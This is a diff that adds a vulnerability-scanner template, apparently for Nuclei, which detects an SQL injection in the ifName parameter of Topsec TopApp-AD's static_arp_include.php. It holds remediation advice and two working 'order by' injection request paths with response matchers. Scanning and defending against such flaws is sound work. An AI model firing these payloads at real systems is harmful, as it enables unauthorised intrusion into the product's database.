@@ -1,0 +1,36 @@
+id: TopApp-AD_static_arp_include_php-SQLi
+info:
+  name: Topsec TopApp-AD static_arp_include.php ifName parameter SQL injection vulnerability
+  author:
+  - l0ne1y
+  description: |-
+    Topsec TopApp-AD static_arp_include.php SQL injection vulnerability
+    Topsec TopApp-AD application delivery system is the application delivery device with the most complete functionality in the industry.
+
+    Topsec TopApp-AD contains an SQL injection vulnerability. Attackers can exploit it to execute SQL statements to view, add, modify, or delete information in the database.
+  severity: high
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.topsec.com.cn/
+
+    Temporary remedy:
+    1. Use prepared statements. When using PDO, be careful not to concatenate variables directly into PDO statements. All query statements should use the parameterized query interface provided by the database; parameterized statements use parameters instead of embedding user input variables into SQL statements. Currently almost all database systems provide a parameterized SQL statement execution interface, which can very effectively prevent SQL injection attacks.
+    2. Escape or encode special characters entering the database (such as '"<>&*; etc.).
+    3. Confirm the type of each data item; for example, numeric data must be numeric, and the corresponding database storage field must be of int type.
+    4. Strictly limit data length, which can to some extent prevent longer SQL injection statements from executing correctly.
+    5. Unify the encoding across every data layer of the website; it is recommended to use UTF-8 throughout, since inconsistent encoding between layers may allow some filtering models to be bypassed.
+    6. Strictly restrict the database operation privileges of website users, giving each user only the minimum privileges needed for their work, thereby minimizing the harm of injection attacks to the database.
+    7. Avoid displaying SQL error information on the website, such as type errors or field mismatches, to prevent attackers from using this error information for further judgment.
+    8. Filter dangerous characters; for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if a match is found.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1==200 && !contains(body_1,"out of range")
+    - status_code_2==200 && contains(body_2,"out of range")
+  path:
+  - '{{BaseURL}}/acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%201--'
+  - '{{BaseURL}}/acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%202--'
+  method: GET
